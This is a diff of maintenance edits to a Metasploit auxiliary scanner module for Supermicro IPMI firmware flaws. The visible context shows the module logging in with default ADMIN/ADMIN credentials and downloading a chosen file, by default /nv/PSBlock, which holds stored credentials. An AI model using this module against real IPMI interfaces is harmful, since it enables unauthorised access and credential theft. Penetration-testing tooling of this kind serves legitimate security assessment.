@@ -1,13 +1,11 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
 require 'uri'
-require 'msf/core'
 
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Scanner
   include Msf::Auxiliary::Report
@@ -36,10 +34,10 @@ class MetasploitModule < Msf::Auxiliary
       'License'     => MSF_LICENSE,
       'References'  =>
         [
-          [ 'URL', 'https://community.rapid7.com/community/metasploit/blog/2013/11/06/supermicro-ipmi-firmware-vulnerabilities' ],
+          [ 'URL', 'https://www.rapid7.com/blog/post/2013/11/06/supermicro-ipmi-firmware-vulnerabilities/' ],
           [ 'URL', 'https://github.com/zenfish/ipmi/blob/master/dump_SM.py']
         ],
-      'DisclosureDate' => 'Nov 06 2013'))
+      'DisclosureDate' => '2013-11-06'))
 
     register_options(
       [
@@ -47,7 +45,7 @@ class MetasploitModule < Msf::Auxiliary
         OptString.new('FILEPATH', [true, 'The name of the file to download', '/nv/PSBlock']),
         OptString.new('PASSWORD', [true, 'Password for Supermicro Web Interface', 'ADMIN']),
         OptString.new('USERNAME', [true, 'Username for Supermicro Web Interface', 'ADMIN'])
-      ], self.class)
+      ])
   end
 
   def my_basename(filename)
@@ -125,7 +123,7 @@ class MetasploitModule < Msf::Auxiliary
       print_error("Failed to login, check credentials.")
       return
     else
-      print_good("Login successful, session: #{session}")
+      print_good("Login Successful, session: #{session}")
     end
 
     contents = read_file(datastore['FILEPATH'], session)
@@ -144,5 +142,4 @@ class MetasploitModule < Msf::Auxiliary
     )
     print_good("File saved in: #{path}")
   end
-
 end
